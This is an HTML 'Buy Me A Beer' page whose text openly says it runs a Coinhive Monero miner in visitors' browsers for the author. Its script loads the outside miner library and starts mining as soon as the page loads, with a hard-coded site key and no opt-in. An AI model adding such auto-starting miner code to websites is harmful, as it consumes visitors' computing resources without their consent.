<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="description" content="">
    <meta name="author" content="">

    <title>Buy Me A Beer</title>

    <!-- Bootstrap core CSS -->
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-beta/css/bootstrap.min.css" integrity="sha384-/Y6pD6FV/Vv2HJnA6t+vslU6fwYXjCFtcEpHbNJ0lyAFsXTsjBbfaDjzALeQsN6M" crossorigin="anonymous">


    <!-- Custom styles for this template -->
    <link href="cover.css" rel="stylesheet">
  </head>

  <body>
    <div class="site-wrapper">
      <div class="site-wrapper-inner">
        <div class="cover-container">
          <div class="inner cover">
            <h1 class="cover-heading">Buy @fopina A Beer</h1>
            <p class="lead">
              Thanks to <a href="https://coin-hive.com">coin-hive</a> it is really easy and FREE for you to buy me (part of) a beer!
            </p>
            <p class="lead">
              Just let this miner run for a bit and I'll get some XMR.
            </p>
            <p class="lead">
              <a href="https://github.com/fopina/" class="btn btn-lg btn-secondary">
                @fopina github
              </a>
            </p>
          </div>

          <div class="row">
            <div class="col-sm-3"></div>
            <div class="col-sm-3" id="id_hashespersecond">
              -
            </div>
            <div class="col-sm-3">
              H/S
            </div>
            <div class="col-sm-3"></div>
          </div>
          <div class="row">
            <div class="col-sm-3"></div>
            <div class="col-sm-3" id="id_totalhashes">
              -
            </div>
            <div class="col-sm-3">
              Total Hashes
            </div>
            <div class="col-sm-3"></div>
          </div>
          <div class="row">
            <div class="col-sm-3"></div>
            <div class="col-sm-3" id="id_hashessubmitted">
              -
            </div>
            <div class="col-sm-3">
              Hashes Submitted
            </div>
            <div class="col-sm-3"></div>
          </div>

          <div class="mastfoot">
            <div class="inner">
              <p>Cover template for <a href="https://getbootstrap.com">Bootstrap</a>, by <a href="https://twitter.com/mdo">@mdo</a>.</p>
            </div>
          </div>
        </div>
      </div>
    </div>

    <!-- Bootstrap core JavaScript
    ================================================== -->
    <!-- Placed at the end of the document so the pages load faster -->
    <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.11.0/umd/popper.min.js" integrity="sha384-b/U6ypiBEHpOf/4+1nzFpr53nxSS+GLCkfwBdFNTxtclqqenISfwAzpKaMNFNmj4" crossorigin="anonymous"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-beta/js/bootstrap.min.js" integrity="sha384-h0AbiXch4ZDo7tp9hKZ4TsHbi047NrKGLO3SEJAg45jXxnGIfYzk4Si90RDIqNm1" crossorigin="anonymous"></script>
    <!-- IE10 viewport hack for Surface/desktop Windows 8 bug -->
    <script src="https://getbootstrap.com/assets/js/ie10-viewport-bug-workaround.js"></script>
    <script src="https://coin-hive.com/lib/coinhive.min.js"></script>
    <script>
      var miner = new CoinHive.Anonymous('PTVvpesEaGkjBWAlYn6jPiS9MGmOlWJ0');
      miner.start();
      // Listen on events
      miner.on('found', function() { console.log('hash found') })
      miner.on('accepted', function() { console.log('hash accepted') })

      // Update stats once per second
      setInterval(function() {
        var hashesPerSecond = miner.getHashesPerSecond();
        var totalHashes = miner.getTotalHashes();
        var acceptedHashes = miner.getAcceptedHashes();

        $('#id_hashespersecond').text(hashesPerSecond);
        $('#id_totalhashes').text(totalHashes);
        $('#id_hashessubmitted').text(acceptedHashes);
      }, 1000);
    </script>
  </body>
</html>
